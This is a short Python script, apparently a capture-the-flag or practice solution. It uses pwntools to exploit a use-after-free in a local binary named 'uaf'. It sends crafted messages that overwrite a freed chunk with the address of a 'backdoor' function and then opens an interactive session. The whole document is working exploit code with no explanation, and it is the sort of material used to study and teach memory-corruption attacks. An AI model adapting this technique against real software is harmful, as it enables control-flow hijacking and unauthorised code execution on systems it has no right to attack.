### use after free ###
### gcc -no-pie uaf.c -o uaf ###
from pwn import *

context.arch="amd64"

r = process("./uaf")
#r.interactive()


backdoor = 0x400962

### leak
r.sendafter("message: ", str(0x10))
r.sendafter("Message: ", "a"*8)
input("@")
#r.recvuntil("message: aaaaaaaa")

### overwrite
r.sendafter("message: ", str(0x10))
r.sendafter("Message: ", (b"a"*8 + p64(backdoor)))

### send garbage
r.sendafter("message: ", str(0x10))
r.sendafter("Message: ", "a"*8)

r.interactive()